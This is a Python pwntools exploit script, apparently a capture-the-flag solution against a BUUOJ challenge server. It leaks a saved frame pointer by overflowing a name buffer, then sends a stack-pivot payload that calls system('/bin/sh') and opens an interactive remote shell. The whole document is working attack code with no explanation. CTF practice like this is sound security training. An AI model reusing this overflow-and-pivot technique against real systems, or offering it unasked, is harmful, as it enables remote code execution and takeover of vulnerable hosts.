from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',28168)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
elf=ELF('./pwn')
#gdb.attach(io)
#pause()

ru(b'''Welcome, my friend. What's your name?''')

payload1=b'a'*0x27+b'b'

s(payload1)

ru(b'b')
#addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
#addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')

ebp=u32(r(4))
#rbp= int(io.recv(12).rjust(16,b'0'),16)
print(hex(ebp))

#38

system=elf.plt['system']

print(hex(system))

callsys=0x08048559
#payload2=b'Tebp'+p32(system)+b'retd'+p32(ebp-0x38+16)+b'/bin/sh\x00'
#payload2=payload2.ljust(0x28)+p32(ebp-0x38)+p32(0x080485FD)
payload2=b'Tebp'+p32(callsys)+p32(ebp-0x38+16-4)+b'/bin/sh\x00'
payload2=payload2.ljust(0x28)+p32(ebp-0x38)+p32(0x080485FD)

s(payload2)



ii()
